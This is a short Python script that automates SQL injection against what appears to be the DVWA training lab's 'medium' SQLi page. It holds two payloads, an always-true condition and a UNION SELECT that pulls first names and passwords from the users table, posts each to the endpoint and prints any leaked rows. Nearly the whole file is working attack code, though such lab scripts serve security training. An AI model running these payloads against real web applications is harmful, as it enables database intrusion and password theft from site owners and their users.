#!/usr/bin/env python3

import requests
import urllib3
from bs4 import BeautifulSoup

from util import http_post

PAYLOADS = [
    "1 OR 1=1 -- ",
    "1 UNION SELECT first_name, password FROM users -- "
]

# -----------------------

def sqli_medium(base_url):
    global PAYLOADS

    print("==================================")
    print("[INFO] - SQLi medium")
    
    url = base_url + "/vulnerabilities/sqli/"    
    for payload in PAYLOADS:
        post_data = f"id={payload}&Submit=Submit"
        r = http_post(url, "medium", data=post_data)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})

        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                print(elem)
